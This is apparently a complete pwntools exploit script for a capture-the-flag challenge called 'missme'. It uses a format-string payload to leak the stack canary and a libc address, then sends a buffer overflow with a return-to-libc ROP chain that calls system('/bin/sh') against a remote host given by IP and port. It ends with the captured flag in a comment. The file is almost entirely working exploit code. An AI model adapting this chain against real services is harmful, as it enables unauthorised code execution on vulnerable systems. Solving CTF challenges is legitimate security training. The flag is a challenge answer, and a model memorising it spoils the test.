#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'
context.os = 'linux'


def exploit(p, libc, pop_rdi_offset, xor_rax_offset, local):
    p.recv()

#    pop_rdi_offset = ROP(libc).find_gadget(['pop rdi', 'ret'])
#    pop_rdi_offset = pop_rdi_offset[0]

    # local offsets
#    pop_rdi_offset = 0x0000000000026b72
#    xor_rax_offset = 0x0000000000044148

    # remote offsets
#    pop_rdi_offset = 0x0000000000023a5f
#    xor_rax_offset = 0x0000000000038160

    bin_sh_offset = next(libc.search(b'/bin/sh\x00'))

    # canary and libc leak

    payload = b'0x%267$016lx - 0x%269$016lx - :::'
    p.sendline(payload)

    leaks = p.recvuntil(b':::').split(b' - ')
    print(p.recvline())

    canary_leak = int(leaks[0], 16)
    libc_start_main_leak = int(leaks[1], 16) - 243
    if not local:
        libc_start_main_leak += 8

    __libc_start_main = libc.symbols['__libc_start_main']
    libc_base = libc_start_main_leak - __libc_start_main

    bin_sh_addr = libc_base + bin_sh_offset
    xor_rax = libc_base + xor_rax_offset
    pop_rdi = libc_base + pop_rdi_offset
    libc_system = libc_base + libc.symbols['system']
    libc_puts = libc_base + libc.symbols['puts']
    libc_exit = libc_base + libc.symbols['exit']

    print("[+] canary leak:       0x%016x" % canary_leak)
    print("[+] bin sh addr:       0x%016x" % bin_sh_addr)
    print("[+] __libc_start_main: 0x%016x" % libc_start_main_leak)
    print("[+] libc base:         0x%016x" % libc_base)
    print("[+] libc pop rdi:      0x%016x" % pop_rdi)
    print("[+] libc xor eax:      0x%016x" % xor_rax)
    print("[+] libc system:       0x%016x" % libc_system)

    # rewrite ret address to set rdi and call system

    payload = b'/bin/cat flag.txt #\x00'
    payload += b'A'* (0x808 - len(payload))
    payload += p64(canary_leak) + p64(libc_system)
    payload += p64(pop_rdi) + p64(bin_sh_addr)
    payload += p64(xor_rax)
    payload += p64(libc_system)
    payload += p64(libc_exit)

    #gdb.attach(p)

    p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    local = sys.argv[1:2] and sys.argv[1] == 'local'
    if local:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process(['./missme'])
    else:
        libc = ELF('./libc.so.6')
        p = remote('185.14.184.242', 15990)
        #p = process(['./ld-2.28.so', '--library-path', './', './missme'])
        #p = process(['./run.sh'])

    rop = ROP(libc)
    pop_rdi_offset = (rop.find_gadget(['pop rdi', 'ret']))[0]
    xor_rax_offset = (rop.find_gadget(['ret']))[0]

    exploit(p, libc, pop_rdi_offset, xor_rax_offset, local)
    # cat /home/missme/flag
    # S4CTF{Here_W3_G0_D1d_you_Mi55_M3??_Old_Fri3nd!}
